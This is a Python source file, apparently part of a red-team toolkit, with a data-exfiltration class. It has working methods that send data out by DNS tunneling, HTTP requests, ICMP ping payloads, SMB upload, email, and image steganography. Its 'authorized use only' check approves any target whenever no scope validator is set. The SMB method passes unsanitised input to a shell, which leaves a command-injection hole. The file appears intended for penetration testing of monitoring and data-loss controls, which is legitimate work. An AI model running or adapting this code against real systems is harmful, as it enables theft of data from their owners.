"""RED TEAM - Data Exfiltration
AUTHORIZED USE ONLY - For penetration testing in controlled lab environments
"""
import logging
import subprocess
import os
import base64
import requests
import socket
import time
from pathlib import Path
from typing import Dict, List, Optional, Any
from datetime import datetime

logger = logging.getLogger("PROMETHEUS-PRIME.RedTeam.Exfil")

class DataExfiltration:
    """
    Data exfiltration techniques for authorized penetration testing.
    All methods require proper authorization and scope validation.
    """

    def __init__(self, scope_validator=None, authorization_required=True):
        self.logger = logger
        self.authorization_required = authorization_required
        self.scope_validator = scope_validator
        self.logger.info("DataExfiltration module initialized - AUTHORIZED PENTESTING ONLY")

    def _check_authorization(self, target: str, method: str) -> bool:
        """Validate authorization before executing exfiltration"""
        if not self.authorization_required:
            self.logger.warning(f"Authorization bypassed for {method} on {target}")
            return True

        if self.scope_validator:
            authorized = self.scope_validator.validate(target, method)
            if not authorized:
                raise PermissionError(f"Target {target} not in authorized scope for {method}")
            return True

        self.logger.warning("No scope validator configured - assuming authorized")
        return True

    def exfil_dns(self, data: str, dns_server: str, domain: str, chunk_size: int = 32) -> Dict[str, Any]:
        """
        Exfiltrate data via DNS queries (DNS tunneling)
        Used to test DNS monitoring and filtering
        """
        self._check_authorization(dns_server, "dns_exfiltration")

        try:
            # Encode data to base32 (DNS-safe)
            encoded = base64.b32encode(data.encode()).decode().lower()
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

            results = []
            for idx, chunk in enumerate(chunks):
                query = f"{chunk}.{idx}.{domain}"
                try:
                    # Attempt DNS lookup (data in subdomain)
                    socket.gethostbyname(query)
                    results.append({"chunk": idx, "query": query, "status": "sent"})
                except socket.gaierror:
                    # Expected - query contains our data, not real domain
                    results.append({"chunk": idx, "query": query, "status": "sent_no_resolution"})

            return {
                "method": "dns_tunneling",
                "status": "complete",
                "chunks_sent": len(chunks),
                "total_bytes": len(data),
                "encoded_length": len(encoded),
                "queries": results
            }

        except Exception as e:
            self.logger.error(f"DNS exfiltration failed: {e}")
            return {"method": "dns_tunneling", "status": "failed", "error": str(e)}

    def exfil_http(self, data: str, target_url: str, method: str = "POST",
                   encoding: str = "base64") -> Dict[str, Any]:
        """
        Exfiltrate data via HTTP/HTTPS requests
        Tests web proxy and DLP controls
        """
        self._check_authorization(target_url, "http_exfiltration")

        try:
            # Encode data
            if encoding == "base64":
                payload = base64.b64encode(data.encode()).decode()
            elif encoding == "hex":
                payload = data.encode().hex()
            else:
                payload = data

            # Send request
            if method.upper() == "POST":
                response = requests.post(target_url, data={"data": payload}, timeout=10)
            elif method.upper() == "GET":
                response = requests.get(f"{target_url}?data={payload}", timeout=10)
            else:
                return {"method": "http", "status": "failed", "error": "Invalid HTTP method"}

            return {
                "method": "http_exfiltration",
                "status": "complete",
                "http_method": method,
                "encoding": encoding,
                "bytes_sent": len(data),
                "payload_size": len(payload),
                "response_code": response.status_code,
                "url": target_url
            }

        except Exception as e:
            self.logger.error(f"HTTP exfiltration failed: {e}")
            return {"method": "http", "status": "failed", "error": str(e)}

    def exfil_icmp(self, data: str, target_ip: str, chunk_size: int = 32) -> Dict[str, Any]:
        """
        Exfiltrate data via ICMP echo requests (ping tunneling)
        Tests ICMP monitoring and deep packet inspection
        """
        self._check_authorization(target_ip, "icmp_exfiltration")

        try:
            # Encode data
            encoded = base64.b64encode(data.encode()).decode()
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

            results = []
            for idx, chunk in enumerate(chunks):
                # Use ping with custom payload (requires root on Linux)
                try:
                    cmd = ["ping", "-c", "1", "-p", chunk.encode().hex(), target_ip]
                    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=5)

                    results.append({
                        "chunk": idx,
                        "status": "sent" if proc.returncode == 0 else "failed",
                        "bytes": len(chunk)
                    })
                except subprocess.TimeoutExpired:
                    results.append({"chunk": idx, "status": "timeout"})

            successful = sum(1 for r in results if r["status"] == "sent")

            return {
                "method": "icmp_tunneling",
                "status": "complete",
                "chunks_sent": successful,
                "chunks_total": len(chunks),
                "total_bytes": len(data),
                "target": target_ip,
                "results": results
            }

        except Exception as e:
            self.logger.error(f"ICMP exfiltration failed: {e}")
            return {"method": "icmp", "status": "failed", "error": str(e)}

    def exfil_smb(self, file_path: str, target_share: str, username: str = None,
                  password: str = None) -> Dict[str, Any]:
        """
        Exfiltrate files via SMB/CIFS shares
        Tests network share monitoring and access controls
        """
        self._check_authorization(target_share, "smb_exfiltration")

        try:
            if not os.path.exists(file_path):
                return {"method": "smb", "status": "failed", "error": "File not found"}

            # Use smbclient to transfer file
            auth = f"-U {username}%{password}" if username and password else "-N"
            filename = os.path.basename(file_path)

            cmd = f'smbclient {target_share} {auth} -c "put {file_path} {filename}"'
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)

            file_size = os.path.getsize(file_path)

            return {
                "method": "smb_transfer",
                "status": "complete" if proc.returncode == 0 else "failed",
                "file": file_path,
                "filename": filename,
                "size_bytes": file_size,
                "target_share": target_share,
                "output": proc.stdout[:500]
            }

        except Exception as e:
            self.logger.error(f"SMB exfiltration failed: {e}")
            return {"method": "smb", "status": "failed", "error": str(e)}

    def exfil_email(self, data: str, smtp_server: str, from_addr: str,
                    to_addr: str, subject: str = "Report") -> Dict[str, Any]:
        """
        Exfiltrate data via email (SMTP)
        Tests email security controls and DLP
        """
        self._check_authorization(smtp_server, "email_exfiltration")

        try:
            import smtplib
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart

            msg = MIMEMultipart()
            msg['From'] = from_addr
            msg['To'] = to_addr
            msg['Subject'] = subject

            # Attach data as email body
            msg.attach(MIMEText(data, 'plain'))

            # Send email
            with smtplib.SMTP(smtp_server, 25, timeout=10) as server:
                server.send_message(msg)

            return {
                "method": "email_exfiltration",
                "status": "complete",
                "smtp_server": smtp_server,
                "from": from_addr,
                "to": to_addr,
                "bytes_sent": len(data),
                "subject": subject
            }

        except Exception as e:
            self.logger.error(f"Email exfiltration failed: {e}")
            return {"method": "email", "status": "failed", "error": str(e)}

    def exfil_steganography(self, data: str, cover_image: str, output_image: str) -> Dict[str, Any]:
        """
        Hide data in image files using steganography
        Tests content inspection and file integrity monitoring
        """
        self._check_authorization(cover_image, "steganography")

        try:
            from PIL import Image
            import numpy as np

            # Load cover image
            img = Image.open(cover_image)
            img_array = np.array(img)

            # Convert data to binary
            data_binary = ''.join(format(ord(c), '08b') for c in data)
            data_binary += '1111111111111110'  # End marker

            # Embed data in LSB of image pixels
            data_index = 0
            for i in range(img_array.shape[0]):
                for j in range(img_array.shape[1]):
                    if data_index < len(data_binary):
                        # Modify LSB of red channel
                        pixel = img_array[i, j]
                        if isinstance(pixel, np.ndarray):
                            pixel[0] = (pixel[0] & 0xFE) | int(data_binary[data_index])
                        data_index += 1
                    else:
                        break
                if data_index >= len(data_binary):
                    break

            # Save modified image
            output_img = Image.fromarray(img_array)
            output_img.save(output_image)

            return {
                "method": "steganography",
                "status": "complete",
                "cover_image": cover_image,
                "output_image": output_image,
                "data_bytes": len(data),
                "bits_embedded": len(data_binary),
                "image_size": img_array.shape
            }

        except Exception as e:
            self.logger.error(f"Steganography failed: {e}")
            return {"method": "steganography", "status": "failed", "error": str(e)}

    def simulate_exfil_detection(self, method: str, target: str, data_size: int) -> Dict[str, Any]:
        """
        Simulate exfiltration attempt for testing detection systems
        Does not actually exfiltrate, only generates traffic patterns
        """
        self.logger.info(f"SIMULATION MODE: {method} exfiltration to {target}")

        return {
            "mode": "simulation",
            "method": method,
            "target": target,
            "simulated_size": data_size,
            "timestamp": datetime.now().isoformat(),
            "status": "simulation_complete",
            "note": "No actual data exfiltrated - detection test only"
        }

    def get_capabilities(self) -> List[str]:
        """Return list of available exfiltration methods"""
        return [
            "dns_tunneling",
            "http_exfiltration",
            "icmp_tunneling",
            "smb_transfer",
            "email_exfiltration",
            "steganography",
            "simulation"
        ]

__all__ = ["DataExfiltration"]
